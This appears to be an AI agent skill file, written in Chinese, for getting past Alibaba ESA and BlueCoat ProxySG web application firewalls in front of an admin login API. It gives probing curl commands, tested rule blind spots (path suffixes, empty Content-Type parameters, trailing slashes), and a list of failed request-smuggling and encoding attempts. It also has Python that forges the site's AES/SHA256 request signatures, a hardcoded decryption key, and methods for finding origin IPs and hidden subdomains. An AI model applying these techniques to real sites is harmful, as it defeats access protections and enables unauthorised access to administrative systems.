---
name: aliyun-esa-bluecoat-waf-bypass
description: "Use when ESA or BlueCoat WAF blocks POST+JSON."
---

# 阿里云 ESA / BlueCoat ProxySG 双 WAF 绕过与签名重构

## 触发

- 响应头 `server: ESA`、`x-tengine-error: denied by http_custom`、`eagleid`、`via: ens-cache*`
- 响应头 `server: PWS/8.3.1.0.8`、`x-px: ...(origin)`、`via: 1.1 PS-XXX`
- POST 返回 `400` + `content-length: 0`（无 body）而 GET 正常
- 前端 JS 里有 `AES` + `SHA256` + `X-Encrypt` 头

## 一、先判定打的是哪一层

```bash
curl -s -i -X POST -H 'Content-Type: application/json' -d '{}' "https://TARGET/api/x" | head -20
```

| 特征 | 判定 |
|---|---|
| `server: ESA` + `content-length: 0` | 阿里云 ESA 自定义规则拦截 |
| `server: ESA` + `x-tengine-error: denied by http_custom` | ESA 自定义规则（站点自配） |
| `server: PWS/8.3.1.0.8` | BlueCoat ProxySG（gccdn 等加速器常用） |
| `server: nginx` + `400` | 到源站 nginx 了，问题在应用层 |
| 应用 JSON `{"code":500,"msg":"服务暂时不可用"}` | 到了 Spring，但 415 被全局异常包装 |
| 纯文本 `非法请求：<uri>` | 应用层自定义 Filter（检查 URI 里的 `;` / `%` / `..`） |

**关键判别**：ESA 的 400 **body 为空**；Spring 的 415/400 有 Whitelabel HTML 或 JSON。

## 二、ESA 规则边界（实测）
以 `/api/admin/auth/login` 为例：

```
POST + application/json           -> 400 ESA（拦）
POST + text/plain                 -> 200 到 Spring 415
POST + text/json, x-json, x-ndjson -> 200 到 Spring 415
POST + application/*+json         -> 400 ESA（拦，全部变体）
POST + Application/Json 大小写     -> 400 ESA（正则不区分大小写）
GET / HEAD / PUT / PATCH / DELETE -> 400 ESA（拦所有标准方法）
OPTIONS                           -> 200 到后端 -> 401/200
TRACE                             -> 405（透传）
POSTX / PROPFIND / REPORT         -> 200 到应用 -> "非法请求 Method"
```

**结论**：ESA 拦的是「**精确路径 + 标准方法 + application/json 家族**」。
ESA **会规范化** `..`、`//`、`%xx`（解码后再匹配），路径变形全部无效。

## 二点五、ESA 规则的两个真实盲点（2026-10 实测新增）

### 盲点 A：路径加 `.json` 后缀 → ESA 不匹配，JSON body 直通

ESA 的自定义规则做**精确路径匹配**，`/api/admin/auth/login.json` 不匹配 `/api/admin/auth/login`：

```
POST /api/admin/auth/login      + application/json -> 400 ESA 空 body
POST /api/admin/auth/login.json + application/json -> 200 到应用（JSON body 完整送达！）
```

**用途**：证明「WAF 挡死的 POST 其实能发进去」，用于判断后续被哪一层拒（本例被 token 拦截器 401，因为拦截器也做精确路径匹配）。
**推广**：任何「WAF 精确路径 + CT 拦截」的场景，先试 `.json` / `.jsp` / `.do` / `.action` 后缀。

### 盲点 B：CT 参数值为空 → ESA 正则漏配

```
application/json                      -> 拦
application/json;charset=UTF-8        -> 拦
application/json;charset=             -> 放行  ← 空值
application/json;x=                   -> 放行  ← 空值
application/json;foo=bar              -> 拦    ← 有值
application/json;                     -> 拦
application/yaml                      -> 拦
application/yaml;x=                   -> 放行
```

**规律**：ESA 的正则要求 `=` 后跟非空值才命中。空参数值全部漏过。

**但 Spring 反向封死**：`;x=` 这类空参数会让 Spring 的 MediaType 解析失败 → **415**。实测「非法 JSON」与「合法 JSON」返回**完全相同**的 `{"code":500,"msg":"服务暂时不可用"}`，证明 body 未被 Jackson 解析、handler 未执行。
**判定方法**：发一版非法 JSON，若错误与合法 JSON 完全一致，说明是多层异常兜底包装，handler 没跑。

### 盲点 C：415 响应头泄露 handler 支持的媒体类型

```bash
curl -si -X POST -H 'Accept: text/html' -H 'Content-Type: text/plain' -d 'a=1' \
  https://TARGET/api/admin/auth/login | grep -i '^accept:'
# accept: application/json, application/yaml, application/*+json
```

这是 Spring `HttpMediaTypeNotSupportedException` 的标准响应头，**直接列出 handler 的 consumes**。
拿到后逐个试探——本例 `application/yaml` 存在 `YamlHttpMessageConverter`（JSON 是 YAML 子集，可用 JSON body 直接打），但 ESA 恰好也拦 `application/yaml`，而 `text/yaml`、`application/x-yaml` 虽能过 ESA 又不被 Spring 认（415）。**这个交集为空的结论只有把 CT 家族全枚举一遍才能得出。**

### 盲点 D：HTTP/3 (QUIC) 与 HTTPS 共用同一规则引擎

ESA 宣告 `alt-svc: h3=":443"`，但用 aioquic 走 HTTP/3 发同样的 POST+JSON **仍然 400**。别指望换协议栈绕 WAF。

```python
# aioquic 1.7: transmit() 是同步方法，不能 await
self._http = H3Connection(self._quic)
sid = self._quic.get_next_available_stream_id()
self._http.send_headers(sid, headers, end_stream=not body)
self._http.send_data(sid, body, end_stream=True)
self.transmit()   # ← 同步
```

### 盲点 E：方法名畸形的分层结果

| 方法写法 | 结果 |
|---|---|
| `post` / `Post` / `pOsT` / `POST ` / ` POST` / `POST\t` | ESA 协议层 400（返回 4254B HTML 错误页，非空 body） |
| `POSTX` / `PROPFIND` | **200 到应用** → `非法请求 Method：POSTX` |

**判据**：ESA 拦方法名畸形时给的是**带 HTML body 的 400**（和 CT 拦截的**空 body 400** 不同）。

## 九、黑产站群实战：反封锁链逆向（2026-10 navbox/91tx 案例）

目标打不动时，不动 WAF，改为**从公开资源反推真实后端**。该案从一张加密图片的 OCR 结果，剥开了 5 层反封锁链，最终抵达无 WAF 的真实 API。

### 9.1 加密静态资源 → 解密 → OCR → 新域名

页面图片指向 OSS 的 `.enc` 文件。解密算法常在主 bundle 里（搜 `AES.decrypt` / `CryptoJS.enc.Base64.parse`）：

```js
const key = CryptoJS.enc.Base64.parse("WywIEQZpDqCZMeDWryr+bw==")
CryptoJS.AES.decrypt({ciphertext: payload}, key, {mode: ECB, padding: Pkcs7})
```

解密后 OCR（或 vision），提取图上的域名 —— 引流素材几乎总带真实落地页。

### 9.2 反封锁链的典型 5 层结构

```
第1层  品牌主页（6188.tv）            ← 防封，只放 base64 加密的下一跳
第2层  {月+日}.{中文域名/jumpcdn}     ← 动态子域，按日期变，punycode 中文域名
第3层  {渠道码1,2,3}.{随机短域}       ← 多个备用，BlueCoat 后
第4层  {随机8位}.{域}/{时间戳}/路径    ← NgxFence 自研 WAF，SPA 落地页
第5层  OSS 静态桶                    ← 最终前端资源
```

关键解码手法（全部实测有效）：
- `atob("...")` 直取下一跳 URL
- base64 里套 punycode：`base64decode` → `idna decode`（得到中文域名）
- `document.write(atob(...))` 嵌套：循环解到出现 `<script>`
- 自定义 base64 字母表：把字母表换成 `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789`

### 9.3 前端 JS 是最终的情报源

落到 SPA 后，主线是**还原字符串拼接**再 grep。混淆器把 `'/clientapi/app/webclip'` 拆成 `'/c'+'li'+'en'+'ta'+'pi'+...`，普通 grep 完全找不到：

```python
# 还原 'a'+'b'+'c' 拼接
pat = re.compile(r"'([^'\\]*)'(?:\s*\+\s*'([^'\\]*)')+")
for m in pat.finditer(src):
    joined = ''.join(re.findall(r"'([^'\\]*)'", m.group(0)))
```

还原后搜 `baseURL`、`/api/`、`appid`、`udidconfig` 等，直接拿到完整 API 契约。

### 9.4 运行时抓契约（比静态分析快）

前端加密/混淆太强时，用 Node 桩环境执行，hook 网络：

```js
// 桩要素：document / location(getter+setter) / XMLHttpRequest(完整生命周期)
// / fetch / localStorage / atob / decodeURIComponent / URLSearchParams / AbortController
this.open = (m,u) => rec('XHR-OPEN', m+' '+u);
this.send = (b) => { /* 手动推 readyState 2→3→4，返回真实响应 */ };
// location.href 必须用 defineProperty 才能捕获跳转：
Object.defineProperty(loc, 'href', { get:()=>_h, set:v=>{_h=v; rec('LOCATION.HREF=', v);} });
```

`addEventListener('DOMContentLoaded', cb)` 要立即调用 cb，否则业务初始化不执行。

### 9.5 自研 WAF 的特征

`server: NgxFence` 是自研轻量 WAF，**只做路径前缀 + JSON CT 检测**，不像 ESA 精确到单路径。前端自己就用 `Content-Type: text/plain;charset=utf-8` 发送 JSON body 绕过 —— 顺着前端写法打即可。

### 9.6 判断后端是「业务 API」还是「管理后台」

`/web/{appId}/{channel}/` 这种层级通常是**分发/统计**（init/clicked），不是后台。管理后台往往在独立域名或独立路径段，需要单独找。

## 十、BlueCoat ProxySG（PWS）规则边界

```
GET / OPTIONS               -> 透传
POST / PUT / PATCH / DELETE -> 400（仅 GET/OPTIONS 允许）
TRACE                       -> 405（PWS 自己回）
POSTX / PROPFIND            -> 200 到应用 -> "非法请求 Method"
```

**唯一突破口**：路径带 **尾斜杠**、`%20`、`;x` 时 PWS **会透传 POST**：

```
POST /api/admin/auth/login/      -> 200 + {"code":401}   ← PWS 透传了
POST /api/admin/auth/login;x     -> 200 + 非法请求：/admin/auth/login;x
POST /api/admin/auth/login%20    -> 200 + {"code":401}
```

但应用 token 拦截器**精确匹配** `/admin/auth/login`，带任何变形都 -> 401。

## 四、应用层 Filter（navbox 类系统常见）

```
URI 解码后含 ; 或 %  -> 纯文本 "非法请求：<uri>"
非标准 HTTP 方法      -> 纯文本 "非法请求 Method：<m>"
```

**这意味着**：`%2F`、`%3B`、`%256C` 双重编码全部被拒。**这是最狠的一层**，比 WAF 更难绕。

## 五、已证伪的绕过清单（不要重复试）

| 类别 | 结果 |
|---|---|
| CT 变体（text/json、x-json、+json、逗号多值、双 CT 头任一顺序） | 全部 Spring 415 |
| CT 空参数（`;x=` / `;charset=`） | ESA 放行但 Spring 415（CT 解析失败） |
| `application/yaml` / `text/yaml` / `application/x-yaml` | ESA 拦前者；后两者过 ESA 但 Spring 415 |
| 路径加 `.json` / `.jsp` / `.do` / `.action` 后缀 | ESA 放行，但应用拦截器同样精确匹配 → 401 |
| HTTP/3 (QUIC) 同请求 | 400，与 HTTPS 共用规则引擎 |
| 方法名小写/前后空格/tab | ESA 协议层 400（HTML body） |
| 方法变体（GET/PUT/PATCH/DELETE/HEAD/TRACE/POSTX/PROPFIND） | WAF 拦或应用拒 |
| 路径编码（%6C/%2F/%3B/%252F 双重） | ESA 先解码再匹配；应用 Filter 拒 % |
| 路径结构（../、//、/./、尾斜杠、尾空格、大小写） | ESA 规范化；拦截器精确匹配 |
| 请求走私（CL.TE / TE.CL / 双 CL） | ESA 直接 400 |
| HTTP/1.0、无 Host、Expect 100-continue、chunked | 全 400 |
| 换出口 IP | ESA 规则全局，与 IP 无关 |
| 全浏览器指纹头（sec-ch-ua / sec-fetch-* / Referer / Origin / acw_tc cookie） | 全 400 |

## 六、签名链路重构（关键资产）

从 `index-legacy.js` 提取：

```js
const r = AES_ECB_encrypt(JSON.stringify(e), KEY)   // base64
const i = Date.now()                                 // timestamp
const a = SHA256(r + i + o + SALT)                   // o = 16位随机 nonce
return {data: r, timestamp: i, nonce: o, sign: a}

// 拦截器
GET : params = {q: data, timestamp, nonce, sign}
POST: data   = {data, timestamp, nonce, sign}; headers['X-Encrypt'] = '1'
```

**Python 复现**：

```python
import base64, hashlib, json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY  = base64.b64decode("<从JS提取>")
SALT = "<从JS提取>"

def enc(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.b64encode(AES.new(KEY, AES.MODE_ECB).encrypt(pad(raw, 16))).decode()

def dec(b64):
    return unpad(AES.new(KEY, AES.MODE_ECB).decrypt(base64.b64decode(b64)), 16).decode()

def sgn(data, ts, nc):
    return hashlib.sha256(f"{data}{ts}{nc}{SALT}".encode()).hexdigest()
```

**三个必踩的坑**：
1. `json.dumps` 必须 `separators=(",", ":")`（紧凑），否则 AES 密文不同
2. **GET 必须用 `requests.get(url, params=...)`，不能手拼 URL** —— base64 里的 `/` 会被当路径分隔符，导致 nginx 404
3. 响应若为 `{"encrypt":true,"data":"..."}`，需 `dec()` 解密再解析

## 七、绕过失败的根因与正确出路

**根因**：ESA（路径+方法+CT）、应用 Filter（`;`/`%`）、token 拦截器（精确路径）三者**规范化规则一致**，无可利用差异。

**正确出路（按性价比）**：
1. **源站 IP**：付费被动 DNS（SecurityTrails / Censys / FOFA 有效 key）。新域名（<30 天）免费 API 全无记录
2. **同 ASN C 段测绘**：找同源未挂 WAF 的兄弟资产
3. **前端数据挖掘**：`page/modules` 之类免鉴权接口常泄露兄弟域名（实测从 191KB 数据挖出 6 个子域）
4. **合规交付**：`OPTIONS`/`TRACE` 透传 + `401` 响应证明规则精确，可作为配置缺陷报告

## 八、挖兄弟域名的有效手法

免鉴权接口返回的数据里 grep 自家域名：

```python
re.findall(r'[a-zA-Z0-9._-]+\.(?:target\.com|target2\.cn)', blob)
```

实测从 landing 页数据挖出 `91dy` / `dy` / `gd` / `md` / `pk` / `pzcm` 六个未在 DNS 字典里的短名子域。**短名（2-4 字母）业务线是这类平台的特征**，字典要覆盖。

## Pitfalls

- `server: ESA` 的 400 **无 body**；应用 400/415 有 body。判错层会白费几小时
- 双 `Content-Type` 头：**ESA 和 Spring 都取第一个**，无法分离
- `OPTIONS` 能过 WAF 但**不执行 handler**（CORS 预处理），别当突破口
- `TRACE` 透传到 Spring 返回 **405**（handler 只 POST），也别当突破口
- 应用 Filter 拒 `%` 意味着**所有 URL 编码都不可用**，只剩纯 ASCII 路径
- 换 IP 无效说明 WAF 规则是全局的（不是 IP 黑名单）
- 短时间大量请求触发限流时返回 `{"code":500,"msg":"请求异常"}`，与签名错误易混。加 `sleep(0.15)` 并重试
